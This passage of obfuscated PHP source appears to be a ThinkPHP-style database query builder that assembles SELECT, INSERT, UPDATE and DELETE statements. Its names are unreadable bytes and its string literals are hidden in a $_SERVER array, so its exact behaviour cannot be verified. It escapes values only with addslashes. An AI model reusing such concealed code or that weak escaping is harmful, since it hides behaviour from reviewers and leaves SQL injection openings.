Ì„]; if (!$Ì¥ëªã ) { return $“û–İ»Á[33]; } if ($“û–İ»Á[914] == $this->dbType) { return $“û–İ»Á[986]; } return $“û–İ»Á[987]; } protected function parseSet($À¶ùÇñ) { $ƒŞàÌñÎ =& $_SERVER[ÏÒ Ì„]; foreach ($À¶ùÇñ as $°„óÄš× => $æŠ“˜§ã) { if (is_array($æŠ“˜§ã) && $ƒŞàÌñÎ[295] == $æŠ“˜§ã[0]) { $èÏ’˜÷[] = $this->parseKey($°„óÄš×) . $ƒŞàÌñÎ[988] . $æŠ“˜§ã[1]; } elseif (is_scalar($æŠ“˜§ã) || is_null($æŠ“˜§ã)) { $èÏ’˜÷[] = $this->parseKey($°„óÄš×) . $ƒŞàÌñÎ[988] . $this->parseValue($æŠ“˜§ã); } } return $ƒŞàÌñÎ[989] . implode($ƒŞàÌñÎ[47], $èÏ’˜÷); } protected function bindParam($ßººŠî, $‚Á´ê±¢) { $this->bind[$_SERVER[ÏÒ Ì„][4] . $ßººŠî] = $‚Á´ê±¢; } protected function parseBind($µü¶â¡) { $µü¶â¡ = array_merge($this->bind, $µü¶â¡); $this->bind = array(); return $µü¶â¡; } function parseKey(&$±àÌÈİ, $Ïªàœ‘ = true) { if ($Ïªàœ‘) { $±àÌÈİ = $this->parseKeyCheck($±àÌÈİ); } return $±àÌÈİ; } function parseKeyCheck($¢€ùú¢) { $Ÿ©³ÍçÛ =& $_SERVER[ÏÒ Ì„]; $¢€ùú¢ = trim($¢€ùú¢); if (!preg_match($Ÿ©³ÍçÛ[990], $¢€ùú¢)) { think_exception($Ÿ©³ÍçÛ[991] . $¢€ùú¢); } return $¢€ùú¢; } protected function parseValue($È€îÆ…É) { $‚ÆéÚéğ =& $_SERVER[ÏÒ Ì„]; if (is_string($È€îÆ…É)) { $È€îÆ…É = $‚ÆéÚéğ[953] . $this->escapeString($È€îÆ…É) . $‚ÆéÚéğ[953]; } elseif (isset($È€îÆ…É[0]) && is_string($È€îÆ…É[0]) && strtolower($È€îÆ…É[0]) == $‚ÆéÚéğ[295]) { $È€îÆ…É = $this->escapeString($È€îÆ…É[1]); } elseif (is_array($È€îÆ…É)) { $È€îÆ…É = array_map(array($this, $‚ÆéÚéğ[954]), $È€îÆ…É); } elseif (is_bool($È€îÆ…É)) { $È€îÆ…É = $È€îÆ…É ? $‚ÆéÚéğ[87] : $‚ÆéÚéğ[191]; } elseif (is_null($È€îÆ…É)) { $È€îÆ…É = $‚ÆéÚéğ[103]; } return $È€îÆ…É; } protected function parseField($Ø–èİûÔ) { $÷ùô‡÷ =& $_SERVER[ÏÒ Ì„]; if (is_string($Ø–èİûÔ) && strpos($Ø–èİûÔ, $÷ùô‡÷[47])) { $Ø–èİûÔ = explode($÷ùô‡÷[47], $Ø–èİûÔ); } if (is_array($Ø–èİûÔ)) { $›±è²° = array(); foreach ($Ø–èİûÔ as $¨ëÊÏÃı => $‡Àî¢û) { if (!is_numeric($¨ëÊÏÃı)) { $›±è²°[] = $this->parseKey($¨ëÊÏÃı, !1) . $÷ùô‡÷[992] . $this->parseKey($‡Àî¢û); } else { $›±è²°[] = $this->parseKey($‡Àî¢û); } } $Œ®Ú´®È = implode($÷ùô‡÷[47], $›±è²°); } elseif (is_string($Ø–èİûÔ) && !empty($Ø–èİûÔ)) { $Œ®Ú´®È = $Ø–èİûÔ; } else { $Œ®Ú´®È = $÷ùô‡÷[182]; } return $Œ®Ú´®È; } protected function parseTable($ç½š…Í) { $şˆ†´ˆ” =& $_SERVER[ÏÒ Ì„]; if (is_array($ç½š…Í)) { $•ûº…ŠÍ = array(); foreach ($ç½š…Í as $Æ“™ÓÛ” => $óòó›ğ) { if (!is_numeric($Æ“™ÓÛ”)) { $•ûº…ŠÍ[] = $this->parseKey($Æ“™ÓÛ”) . $şˆ†´ˆ”[50] . $this->parseKey($óòó›ğ); } else { $•ûº…ŠÍ[] = $this->parseKey($Æ“™ÓÛ”); } } $ç½š…Í = $•ûº…ŠÍ; } elseif (is_string($ç½š…Í)) { if (strstr($ç½š…Í, $şˆ†´ˆ”[50])) { return $ç½š…Í; } $ç½š…Í = explode($şˆ†´ˆ”[47], $ç½š…Í); array_walk($ç½š…Í, array($this, $şˆ†´ˆ”[903])); } return $şˆ†´ˆ”[897] . trim(implode($şˆ†´ˆ”[993], $ç½š…Í), $şˆ†´ˆ”[383]) . $şˆ†´ˆ”[897]; } protected function parseWhere($ˆÉ·÷ò‰) { $£˜ó£†ñ =& $_SERVER[ÏÒ Ì„]; $Ù€ş‹şô = $£˜ó£†ñ[33]; if (is_string($ˆÉ·÷ò‰)) { $Ù€ş‹şô = $ˆÉ·÷ò‰; } else { $ÇëÔÜÇ = isset($ˆÉ·÷ò‰[$£˜ó£†ñ[994]]) ? strtoupper($ˆÉ·÷ò‰[$£˜ó£†ñ[994]]) : $£˜ó£†ñ[33]; if (in_array($ÇëÔÜÇ, array($£˜ó£†ñ[995], $£˜ó£†ñ[996], $£˜ó£†ñ[997]))) { $ÇëÔÜÇ = $£˜ó£†ñ[50] . $ÇëÔÜÇ . $£˜ó£†ñ[50]; unset($ˆÉ·÷ò‰[$£˜ó£†ñ[994]]); } else { $ÇëÔÜÇ = $£˜ó£†ñ[998]; } foreach ($ˆÉ·÷ò‰ as $¨ÜŠñ¢ä => $ü®÷ ‚¸) { $Ù€ş‹şô .= $£˜ó£†ñ[275]; if (is_numeric($¨ÜŠñ¢ä)) { $¨ÜŠñ¢ä = $£˜ó£†ñ[999]; } if (0 === strpos($¨ÜŠñ¢ä, $£˜ó£†ñ[71])) { $Ù€ş‹şô .= $this->parseThinkWhere($¨ÜŠñ¢ä, $ü®÷ ‚¸); } else { if (!preg_match($£˜ó£†ñ[1000], trim($¨ÜŠñ¢ä))) { think_exception(think_lang($£˜ó£†ñ[1001]) . $£˜ó£†ñ[4] . $¨ÜŠñ¢ä); } $ŒÜê¢ëÔ = is_array($ü®÷ ‚¸) && isset($ü®÷ ‚¸[$£˜ó£†ñ[1002]]); $¨ÜŠñ¢ä = trim($¨ÜŠñ¢ä); if (strpos($¨ÜŠñ¢ä, $£˜ó£†ñ[281])) { $—è¯°§ = explode($£˜ó£†ñ[281], $¨ÜŠñ¢ä); $ÅÛĞÑ¨õ = array(); foreach ($—è¯°§ as $–ËØÈÈÀ => $‡¼ÂôÅó) { $Äç¹õÔı = $ŒÜê¢ëÔ ? $ü®÷ ‚¸[$–ËØÈÈÀ] : $ü®÷ ‚¸; $ÅÛĞÑ¨õ[] = $£˜ó£†ñ[258] . $this->parseWhereItem($this->parseKey($‡¼ÂôÅó), $Äç¹õÔı) . $£˜ó£†ñ[902]; } $Ù€ş‹şô .= implode($£˜ó£†ñ[1003], $ÅÛĞÑ¨õ); } elseif (strpos($¨ÜŠñ¢ä, $£˜ó£†ñ[282])) { $—è¯°§ = explode($£˜ó£†ñ[282], $¨ÜŠñ¢ä); $ÅÛĞÑ¨õ = array(); foreach ($—è¯°§ as $–ËØÈÈÀ => $‡¼ÂôÅó) { $Äç¹õÔı = $ŒÜê¢ëÔ ? $ü®÷ ‚¸[$–ËØÈÈÀ] : $ü®÷ ‚¸; $ÅÛĞÑ¨õ[] = $£˜ó£†ñ[258] . $this->parseWhereItem($this->parseKey($‡¼ÂôÅó), $Äç¹õÔı) . $£˜ó£†ñ[902]; } $Ù€ş‹şô .= implode($£˜ó£†ñ[998], $ÅÛĞÑ¨õ); } else { $Ù€ş‹şô .= $this->parseWhereItem($this->parseKey($¨ÜŠñ¢ä), $ü®÷ ‚¸); } } $Ù€ş‹şô .= $£˜ó£†ñ[276] . $ÇëÔÜÇ; } $Ù€ş‹şô = substr($Ù€ş‹şô, 0, -strlen($ÇëÔÜÇ)); } return empty($Ù€ş‹şô) ? $£˜ó£†ñ[33] : $£˜ó£†ñ[1004] . $Ù€ş‹şô; } protected function parseWhereItem($©‹Ç‰‰², $´¨¯¯½Í) { $¹¨ØÜù™ =& $_SERVER[ÏÒ Ì„]; $Ò¥ãîØ… = $¹¨ØÜù™[33]; if (is_array($´¨¯¯½Í)) { if (is_string($´¨¯¯½Í[0])) { $½ä‚…Ä¦ = strtolower($´¨¯¯½Í[0]); if (in_array($´¨¯¯½Í[0], array($¹¨ØÜù™[988], $¹¨ØÜù™[1005], $¹¨ØÜù™[1006], $¹¨ØÜù™[1007], $¹¨ØÜù™[1008], $¹¨ØÜù™[1009]))) { $Ò¥ãîØ… .= $©‹Ç‰‰² . $¹¨ØÜù™[50] . $´¨¯¯½Í[0] . $¹¨ØÜù™[50] . $this->parseValue($´¨¯¯½Í[1]); } elseif (preg_match($¹¨ØÜù™[1010], $´¨¯¯½Í[0])) { $Ò¥ãîØ… .= $©‹Ç‰‰² . $¹¨ØÜù™[50] . $this->exp[$½ä‚…Ä¦] . $¹¨ØÜù™[50] . $this->parseValue($´¨¯¯½Í[1]); } elseif (preg_match($¹¨ØÜù™[1011], $´¨¯¯½Í[0])) { if (is_array($´¨¯¯½Í[1])) { $œÏÉÜ²é = isset($´¨¯¯½Í[2]) ? strtoupper($´¨¯¯½Í[2]) : $¹¨ØÜù™[996]; if (in_array($œÏÉÜ²é, array($¹¨ØÜù™[995], $¹¨ØÜù™[996], $¹¨ØÜù™[997]))) { $ñ©âÕÄ = array(); foreach ($´¨¯¯½Í[1] as $ÍÂƒ½Áº) { $ñ©âÕÄ[] = $©‹Ç‰‰² . $¹¨ØÜù™[50] . $this->exp[$½ä‚…Ä¦] . $¹¨ØÜù™[50] . $this->parseValue($ÍÂƒ½Áº); } $Ò¥ãîØ… .= $¹¨ØÜù™[258] . implode($¹¨ØÜù™[50] . $œÏÉÜ²é . $¹¨ØÜù™[50], $ñ©âÕÄ) . $¹¨ØÜù™[902]; } } else { $Ò¥ãîØ… .= $©‹Ç‰‰² . $¹¨ØÜù™[50] . $this->exp[$½ä‚…Ä¦] . $¹¨ØÜù™[50] . $this->parseValue($´¨¯¯½Í[1]); } } elseif ($¹¨ØÜù™[295] == $½ä‚…Ä¦) { $Ò¥ãîØ… .= $¹¨ØÜù™[900] . $©‹Ç‰‰² . $¹¨ØÜù™[50] . $´¨¯¯½Í[1] . $¹¨ØÜù™[1012]; } elseif (preg_match($¹¨ØÜù™[1013], $´¨¯¯½Í[0])) { $Ò¥ãîØ… .= $´¨¯¯½Í[0]; } elseif (preg_match($¹¨ØÜù™[1014], $´¨¯¯½Í[0])) { if (isset($´¨¯¯½Í[2]) && $¹¨ØÜù™[295] == $´¨¯¯½Í[2]) { $Ò¥ãîØ… .= $©‹Ç‰‰² . $¹¨ØÜù™[50] . $this->exp[$½ä‚…Ä¦] . $¹¨ØÜù™[50] . $´¨¯¯½Í[1]; } else { if (is_string($´¨¯¯½Í[1])) { $´¨¯¯½Í[1] = explode($¹¨ØÜù™[47], $´¨¯¯½Í[1]); } $ü±¢’¬© = implode($¹¨ØÜù™[47], $this->parseValue($´¨¯¯½Í[1])); $Ò¥ãîØ… .= $©‹Ç‰‰² . $¹¨ØÜù™[50] . $this->exp[$½ä‚…Ä¦] . $¹¨ØÜù™[900] . $ü±¢’¬© . $¹¨ØÜù™[902]; } } elseif (preg_match($¹¨ØÜù™[1015], $´¨¯¯½Í[0])) { $®ô–ßä‹ = is_string($´¨¯¯½Í[1]) ? explode($¹¨ØÜù™[47], $´¨¯¯½Í[1]) : $´¨¯¯½Í[1]; $Ò¥ãîØ… .= $¹¨ØÜù™[900] . $©‹Ç‰‰² . $¹¨ØÜù™[50] . $this->exp[$½ä‚…Ä¦] . $¹¨ØÜù™[50] . $this->parseValue($®ô–ßä‹[0]) . $¹¨ØÜù™[998] . $this->parseValue($®ô–ßä‹[1]) . $¹¨ØÜù™[276]; } else { think_exception(think_lang($¹¨ØÜù™[1001]) . $¹¨ØÜù™[4] . $´¨¯¯½Í[0]); } } else { $Œ¾Šó¦‚ = count($´¨¯¯½Í); $¯»ğí¬¢ = $¹¨ØÜù™[33]; if (is_string($´¨¯¯½Í[$Œ¾Šó¦‚ - 1])) { $¯»ğí¬¢ = isset($´¨¯¯½Í[$Œ¾Šó¦‚ - 1]) ? strtoupper($´¨¯¯½Í[$Œ¾Šó¦‚ - 1]) : $¹¨ØÜù™[33]; if (in_array($¯»ğí¬¢, array($¹¨ØÜù™[995], $¹¨ØÜù™[996], $¹¨ØÜù™[997]))) { $Œ¾Šó¦‚ = $Œ¾Šó¦‚ - 1; } } else { $¯»ğí¬¢ = $¹¨ØÜù™[995]; } for ($¯öì…’Ç = 0; $¯öì…’Ç < $Œ¾Šó¦‚; $¯öì…’Ç++) { $®ô–ßä‹ = is_array($´¨¯¯½Í[$¯öì…’Ç]) ? $´¨¯¯½Í[$¯öì…’Ç][1] : $´¨¯¯½Í[$¯öì…’Ç]; if ($¹¨ØÜù™[295] == strtolower($´¨¯¯½Í[$¯öì…’Ç][0])) { $Ò¥ãîØ… .= $¹¨ØÜù™[258] . $©‹Ç‰‰² . $¹¨ØÜù™[50] . $®ô–ßä‹ . $¹¨ØÜù™[1012] . $¯»ğí¬¢ . $¹¨ØÜù™[50]; } else { $ÏÑšï¿³ = is_array($´¨¯¯½Í[$¯öì…’Ç]) ? $this->exp[strtolower($´¨¯¯½Í[$¯öì…’Ç][0])] : $¹¨ØÜù™[988]; if (!$ÏÑšï¿³ && is_array($´¨¯¯½Í[$¯öì…’Ç]) && in_array($´¨¯¯½Í[$¯öì…’Ç][0], array($¹¨ØÜù™[988], $¹¨ØÜù™[1005], $¹¨ØÜù™[1006], $¹¨ØÜù™[1007], $¹¨ØÜù™[1008], $¹¨ØÜù™[1009]))) { $ÏÑšï¿³ = $´¨¯¯½Í[$¯öì…’Ç][0]; } $Ò¥ãîØ… .= $¹¨ØÜù™[258] . $©‹Ç‰‰² . $¹¨ØÜù™[50] . $ÏÑšï¿³ . $¹¨ØÜù™[50] . $this->parseValue($®ô–ßä‹) . $¹¨ØÜù™[1012] . $¯»ğí¬¢ . $¹¨ØÜù™[50]; } } $Ò¥ãîØ… = substr($Ò¥ãîØ…, 0, -4); } } else { $Ò¥ãîØ… .= $©‹Ç‰‰² . $¹¨ØÜù™[1016] . $this->parseValue($´¨¯¯½Í); } return $Ò¥ãîØ…; } protected function parseThinkWhere($÷™Ì˜ƒÍ, $¾‘”±º˜) { $¯Â½™’æ =& $_SERVER[ÏÒ Ì„]; $Á¦¹ß = $¯Â½™’æ[33]; switch ($÷™Ì˜ƒÍ) { case $¯Â½™’æ[350]: $Á¦¹ß = $¾‘”±º˜; break; case $¯Â½™’æ[999]: $Á¦¹ß = is_string($¾‘”±º˜) ? $¾‘”±º˜ : substr($this->parseWhere($¾‘”±º˜), 6); break; case $¯Â½™’æ[1017]: parse_str($¾‘”±º˜, $¸ÌŠ·‘Ÿ); if (isset($¸ÌŠ·‘Ÿ[$¯Â½™’æ[994]])) { $›ÑÈòçı = $¯Â½™’æ[50] . strtoupper($¸ÌŠ·‘Ÿ[$¯Â½™’æ[994]]) . $¯Â½™’æ[50]; unset($¸ÌŠ·‘Ÿ[$¯Â½™’æ[994]]); } else { $›ÑÈòçı = $¯Â½™’æ[998]; } $Æ±Í¶ÙÂ = array(); foreach ($¸ÌŠ·‘Ÿ as $èÆ‡ => $ÖÓßœ¦¹) { $Æ±Í¶ÙÂ[] = $this->parseKey($èÆ‡) . $¯Â½™’æ[1016] . $this->parseValue($ÖÓßœ¦¹); } $Á¦¹ß = implode($›ÑÈòçı, $Æ±Í¶ÙÂ); break; } return $Á¦¹ß; } protected function parseLimit($’¹§ş€Â) { $ÜÕÛ¿šÜ =& $_SERVER[ÏÒ Ì„]; return !empty($’¹§ş€Â) ? $ÜÕÛ¿šÜ[48] . $’¹§ş€Â . $ÜÕÛ¿šÜ[50] : $ÜÕÛ¿šÜ[33]; } protected function parseJoin($ü§ÓÜı¢) { $´Èó°‰Ò =& $_SERVER[ÏÒ Ì„]; $öÏï«¥Ô = $´Èó°‰Ò[33]; if (!empty($ü§ÓÜı¢)) { if (is_array($ü§ÓÜı¢)) { foreach ($ü§ÓÜı¢ as $×Óõßõ´ => $ÕíàÉïí) { if (!1 !== stripos($ÕíàÉïí, $´Èó°‰Ò[1018])) { $öÏï«¥Ô .= $´Èó°‰Ò[50] . $ÕíàÉïí; } else { $öÏï«¥Ô .= $´Èó°‰Ò[1019] . $ÕíàÉïí; } } } else { $öÏï«¥Ô .= $´Èó°‰Ò[1019] . $ü§ÓÜı¢; } } $öÏï«¥Ô = preg_replace($´Èó°‰Ò[1020], think_config($´Èó°‰Ò[926]) . $´Èó°‰Ò[1021], $öÏï«¥Ô); return $öÏï«¥Ô; } protected function parseOrder($Û‘ûã€Ë) { $»¼è¨ ¢ =& $_SERVER[ÏÒ Ì„]; if (is_array($Û‘ûã€Ë)) { $˜Åª¿Â— = array(); foreach ($Û‘ûã€Ë as $Åì°¼¥ => $°“—ôÈ) { if (is_numeric($Åì°¼¥)) { $˜Åª¿Â—[] = $this->parseKey($°“—ôÈ); } else { $°“—ôÈ = in_array(strtoupper(trim($°“—ôÈ)), array($»¼è¨ ¢[1022], $»¼è¨ ¢[1023])) ? $»¼è¨ ¢[50] . $°“—ôÈ : $»¼è¨ ¢[33]; if (preg_match($»¼è¨ ¢[1024], $Åì°¼¥)) { $˜Åª¿Â—[] = $this->parseKey($Åì°¼¥) . $°“—ôÈ; } else { think_exception($»¼è¨ ¢[1025] . $Åì°¼¥); } } } $Û‘ûã€Ë = implode($»¼è¨ ¢[47], $˜Åª¿Â—); } return !empty($Û‘ûã€Ë) ? $»¼è¨ ¢[1026] . $Û‘ûã€Ë : $»¼è¨ ¢[33]; } protected function parseGroup($¾ ™øùï) { $Ê”ûıÈÛ =& $_SERVER[ÏÒ Ì„]; return !empty($¾ ™øùï) ? $Ê”ûıÈÛ[1027] . $¾ ™øùï : $Ê”ûıÈÛ[33]; } protected function parseHaving($ùœˆˆ»÷) { $³Ÿ¦†ºé =& $_SERVER[ÏÒ Ì„]; return !empty($ùœˆˆ»÷) ? $³Ÿ¦†ºé[1028] . $ùœˆˆ»÷ : $³Ÿ¦†ºé[33]; } protected function parseComment($ºÚ†‡Š¥) { $«’ÅÕÆ =& $_SERVER[ÏÒ Ì„]; return !empty($ºÚ†‡Š¥) ? $«’ÅÕÆ[1029] . $ºÚ†‡Š¥ . $«’ÅÕÆ[1030] : $«’ÅÕÆ[33]; } protected function parseDistinct($ªµÙìµ) { $İøáÖ· =& $_SERVER[ÏÒ Ì„]; return !empty($ªµÙìµ) ? $İøáÖ·[1031] : $İøáÖ·[33]; } protected function parseUnion($îõçğã) { $ÄçÈŠ´£ =& $_SERVER[ÏÒ Ì„]; if (empty($îõçğã)) { return $ÄçÈŠ´£[33]; } if (isset($îõçğã[$ÄçÈŠ´£[346]])) { $µ˜×ãœú = $ÄçÈŠ´£[1032]; unset($îõçğã[$ÄçÈŠ´£[346]]); } else { $µ˜×ãœú = $ÄçÈŠ´£[1033]; } foreach ($îõçğã as $İ²®ëî£) { $œŞ®¢Æä[] = $µ˜×ãœú . (is_array($İ²®ëî£) ? $this->buildSelectSql($İ²®ëî£) : $İ²®ëî£); } return implode($ÄçÈŠ´£[50], $œŞ®¢Æä); } public function insert($¾ª¨›­®, $øŠ•öË÷ = array(), $ºä¤òÅ = false) { $ƒóºöÒş =& $_SERVER[ÏÒ Ì„]; $…ŞÁ®ƒ© = $ÍØƒ¸— = array(); $this->model = $øŠ•öË÷[$ƒóºöÒş[279]]; foreach ($¾ª¨›­® as $ŞÖÂ…§ => $¥Ëö÷å‘) { if (is_array($¥Ëö÷å‘) && $ƒóºöÒş[295] == $¥Ëö÷å‘[0]) { $ÍØƒ¸—[] = $this->parseKey($ŞÖÂ…§); $…ŞÁ®ƒ©[] = $¥Ëö÷å‘[1]; } elseif (is_scalar($¥Ëö÷å‘) || is_null($¥Ëö÷å‘)) { $ÍØƒ¸—[] = $this->parseKey($ŞÖÂ…§); $…ŞÁ®ƒ©[] = $this->parseValue($¥Ëö÷å‘); } } $ìøûÏ = ($ºä¤òÅ ? $ƒóºöÒş[904] : $ƒóºöÒş[905]) . $ƒóºöÒş[906] . $this->parseTable($øŠ•öË÷[$ƒóºöÒş[277]]) . $ƒóºöÒş[900] . implode($ƒóºöÒş[47], $ÍØƒ¸—) . $ƒóºöÒş[901] . implode($ƒóºöÒş[47], $…ŞÁ®ƒ©) . $ƒóºöÒş[902]; $ìøûÏ .= $this->parseLock(isset($øŠ•öË÷[$ƒóºöÒş[840]]) ? $øŠ•öË÷[$ƒóºöÒş[840]] : !1); $ìøûÏ .= $this->parseComment(!empty($øŠ•öË÷[$ƒóºöÒş[352]]) ? $øŠ•öË÷[$ƒóºöÒş[352]] : $ƒóºöÒş[33]); return $this->execute($ìøûÏ, $this->parseBind(!empty($øŠ•öË÷[$ƒóºöÒş[283]]) ? $øŠ•öË÷[$ƒóºöÒş[283]] : array())); } public function selectInsert($°û€ğÏÕ, $¯ÑóˆÀ‡, $®ÙêöÈ‹ = array()) { $³Çùµëû =& $_SERVER[ÏÒ Ì„]; $this->model = $®ÙêöÈ‹[$³Çùµëû[279]]; if (is_string($°û€ğÏÕ)) { $°û€ğÏÕ = explode($³Çùµëû[47], $°û€ğÏÕ); } array_walk($°û€ğÏÕ, array($this, $³Çùµëû[903])); $ÏÊùØ¦Ç = $³Çùµëû[1034] . $this->parseTable($¯ÑóˆÀ‡) . $³Çùµëû[900] . implode($³Çùµëû[47], $°û€ğÏÕ) . $³Çùµëû[1012]; $ÏÊùØ¦Ç .= $this->buildSelectSql($®ÙêöÈ‹); return $this->execute($ÏÊùØ¦Ç, $this->parseBind(!empty($®ÙêöÈ‹[$³Çùµëû[283]]) ? $®ÙêöÈ‹[$³Çùµëû[283]] : array())); } public function update($İÜãÌË§, $®ˆ…ş³») { $ä¯ÒÒ×— =& $_SERVER[ÏÒ Ì„]; $this->model = $®ˆ…ş³»[$ä¯ÒÒ×—[279]]; $ºÎ÷ëƒŞ = $ä¯ÒÒ×—[1035] . $this->parseTable($®ˆ…ş³»[$ä¯ÒÒ×—[277]]) . $this->parseSet($İÜãÌË§) . $this->parseWhere(!empty($®ˆ…ş³»[$ä¯ÒÒ×—[273]]) ? $®ˆ…ş³»[$ä¯ÒÒ×—[273]] : $ä¯ÒÒ×—[33]) . $this->parseOrder(!empty($®ˆ…ş³»[$ä¯ÒÒ×—[363]]) ? $®ˆ…ş³»[$ä¯ÒÒ×—[363]] : $ä¯ÒÒ×—[33]) . $this->parseLimit(!empty($®ˆ…ş³»[$ä¯ÒÒ×—[290]]) ? $®ˆ…ş³»[$ä¯ÒÒ×—[290]] : $ä¯ÒÒ×—[33]) . $this->parseLock(isset($®ˆ…ş³»[$ä¯ÒÒ×—[840]]) ? $®ˆ…ş³»[$ä¯ÒÒ×—[840]] : !1) . $this->parseComment(!empty($®ˆ…ş³»[$ä¯ÒÒ×—[352]]) ? $®ˆ…ş³»[$ä¯ÒÒ×—[352]] : $ä¯ÒÒ×—[33]); return $this->execute($ºÎ÷ëƒŞ, $this->parseBind(!empty($®ˆ…ş³»[$ä¯ÒÒ×—[283]]) ? $®ˆ…ş³»[$ä¯ÒÒ×—[283]] : array())); } public function delete($¾¸×ñ¬¾ = array()) { $å„Œ†°Ò =& $_SERVER[ÏÒ Ì„]; $this->model = $¾¸×ñ¬¾[$å„Œ†°Ò[279]]; $‡ªÇ³êÛ = $å„Œ†°Ò[1036] . $this->parseTable($¾¸×ñ¬¾[$å„Œ†°Ò[277]]) . $this->parseWhere(!empty($¾¸×ñ¬¾[$å„Œ†°Ò[273]]) ? $¾¸×ñ¬¾[$å„Œ†°Ò[273]] : $å„Œ†°Ò[33]) . $this->parseOrder(!empty($¾¸×ñ¬¾[$å„Œ†°Ò[363]]) ? $¾¸×ñ¬¾[$å„Œ†°Ò[363]] : $å„Œ†°Ò[33]) . $this->parseLimit(!empty($¾¸×ñ¬¾[$å„Œ†°Ò[290]]) ? $¾¸×ñ¬¾[$å„Œ†°Ò[290]] : $å„Œ†°Ò[33]) . $this->parseLock(isset($¾¸×ñ¬¾[$å„Œ†°Ò[840]]) ? $¾¸×ñ¬¾[$å„Œ†°Ò[840]] : !1) . $this->parseComment(!empty($¾¸×ñ¬¾[$å„Œ†°Ò[352]]) ? $¾¸×ñ¬¾[$å„Œ†°Ò[352]] : $å„Œ†°Ò[33]); return $this->execute($‡ªÇ³êÛ, $this->parseBind(!empty($¾¸×ñ¬¾[$å„Œ†°Ò[283]]) ? $¾¸×ñ¬¾[$å„Œ†°Ò[283]] : array())); } public function select($÷ĞõÌĞŞ = array()) { $ÌÓÂŞçø =& $_SERVER[ÏÒ Ì„]; $this->model = $÷ĞõÌĞŞ[$ÌÓÂŞçø[279]]; $Ş”±²Áë = $this->buildSelectSql($÷ĞõÌĞŞ); $é€³—İÔ = isset($÷ĞõÌĞŞ[$ÌÓÂŞçø[347]]) ? $÷ĞõÌĞŞ[$ÌÓÂŞçø[347]] : !1; if ($é€³—İÔ) { $¸Ó›ìÍ÷ = is_string($é€³—İÔ[$ÌÓÂŞçø[93]]) ? $é€³—İÔ[$ÌÓÂŞçø[93]] : $ÌÓÂŞçø[1037] . md5($Ş”±²Áë); $îÁ‡°ë‘ = think_cache($¸Ó›ìÍ÷, $ÌÓÂŞçø[33], $é€³—İÔ); if (!1 !== $îÁ‡°ë‘) { return $îÁ‡°ë‘; } } $•¥‰ıÊº = $this->query($Ş”±²Áë, $this->parseBind(!empty($÷ĞõÌĞŞ[$ÌÓÂŞçø[283]]) ? $÷ĞõÌĞŞ[$ÌÓÂŞçø[283]] : array())); if ($é€³—İÔ && !1 !== $•¥‰ıÊº) { think_cache($¸Ó›ìÍ÷, $•¥‰ıÊº, $é€³—İÔ); } return $•¥‰ıÊº; } public function buildSelectSql($Œ™€„š£ = array()) { $éœË„ï‚ =& $_SERVER[ÏÒ Ì„]; if (isset($Œ™€„š£[$éœË„ï‚[351]])) { if (strpos($Œ™€„š£[$éœË„ï‚[351]], $éœË„ï‚[47])) { list($¼şœÅá¦, $È¯™£Ñâ) = explode($éœË„ï‚[47], $Œ™€„š£[$éœË„ï‚[351]]); } else { $¼şœÅá¦ = $Œ™€„š£[$éœË„ï‚[351]]; } $¼şœÅá¦ = $¼şœÅá¦ ? $¼şœÅá¦ : 1; $È¯™£Ñâ = isset($È¯™£Ñâ) ? $È¯™£Ñâ : (is_numeric($Œ™€„š£[$éœË„ï‚[290]]) ? $Œ™€„š£[$éœË„ï‚[290]] : 20); $À“ÆÊãè = $È¯™£Ñâ * ((int) $¼şœÅá¦ - 1); $Œ™€„š£[$éœË„ï‚[290]] = $À“ÆÊãè . $éœË„ï‚[47] . $È¯™£Ñâ; } if (think_config($éœË„ï‚[1038])) { $ÖúÇ™ºü = $éœË„ï‚[1039] . md5(serialize($Œ™€„š£)); $ıè‘•ÁÒ = think_cache($ÖúÇ™ºü); if ($ıè‘•ÁÒ) { return $ıè‘•ÁÒ; } } $òÁôîú = $this->parseSql($this->selectSql, $Œ™€„š£); $òÁôîú .= $this->parseLock(isset($Œ™€„š£[$éœË„ï‚[840]]) ? $Œ™€„š£[$éœË„ï‚[840]] : !1); if (isset($ÖúÇ™ºü)) { think_cache($ÖúÇ™ºü, $òÁôîú); } return $òÁôîú; } public function parseSql($ú´ôà¯½, $ê¬ÅÕ¬© = array()) { $ ×àıª´ =& $_SERVER[ÏÒ Ì„]; $ú´ôà¯½ = str_replace(array($ ×àıª´[1040], $ ×àıª´[1041], $ ×àıª´[1042], $ ×àıª´[1043], $ ×àıª´[1044], $ ×àıª´[1045], $ ×àıª´[1046], $ ×àıª´[1047], $ ×àıª´[1048], $ ×àıª´[1049], $ ×àıª´[1050]), array($this->parseTable("{$ê¬ÅÕ¬©[$ ×àıª´[277]]}"), $this->parseDistinct(isset($ê¬ÅÕ¬©[$ ×àıª´[1051]]) ? $ê¬ÅÕ¬©[$ ×àıª´[1051]] : !1), $this->parseField(!empty($ê¬ÅÕ¬©[$ ×àıª´[271]]) ? $ê¬ÅÕ¬©[$ ×àıª´[271]] : $ ×àıª´[182]), $this->parseJoin(!empty($ê¬ÅÕ¬©[$ ×àıª´[280]]) ? $ê¬ÅÕ¬©[$ ×àıª´[280]] : $ ×àıª´[33]), $this->parseWhere(!empty($ê¬ÅÕ¬©[$ ×àıª´[273]]) ? $ê¬ÅÕ¬©[$ ×àıª´[273]] : $ ×àıª´[33]), $this->parseGroup(!empty($ê¬ÅÕ¬©[$ ×àıª´[509]]) ? $ê¬ÅÕ¬©[$ ×àıª´[509]] : $ ×àıª´[33]), $this->parseHaving(!empty($ê¬ÅÕ¬©[$ ×àıª´[1052]]) ? $ê¬ÅÕ¬©[$ ×àıª´[1052]] : $ ×àıª´[33]), $this->parseOrder(!empty($ê¬ÅÕ¬©[$ ×àıª´[363]]) ? $ê¬ÅÕ¬©[$ ×àıª´[363]] : $ ×àıª´[33]), $this->parseLimit(!empty($ê¬ÅÕ¬©[$ ×àıª´[290]]) ? $ê¬ÅÕ¬©[$ ×àıª´[290]] : $ ×àıª´[33]), $this->parseUnion(!empty($ê¬ÅÕ¬©[$ ×àıª´[345]]) ? $ê¬ÅÕ¬©[$ ×àıª´[345]] : $ ×àıª´[33]), $this->parseComment(!empty($ê¬ÅÕ¬©[$ ×àıª´[352]]) ? $ê¬ÅÕ¬©[$ ×àıª´[352]] : $ ×àıª´[33])), $ú´ôà¯½); return $ú´ôà¯½; } public function getLastSql($£Àú¢Ã¾ = '') { return $£Àú¢Ã¾ ? $this->modelSql[$£Àú¢Ã¾] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ç¦€ÌÖ) { return addslashes($ç¦€ÌÖ); } public function 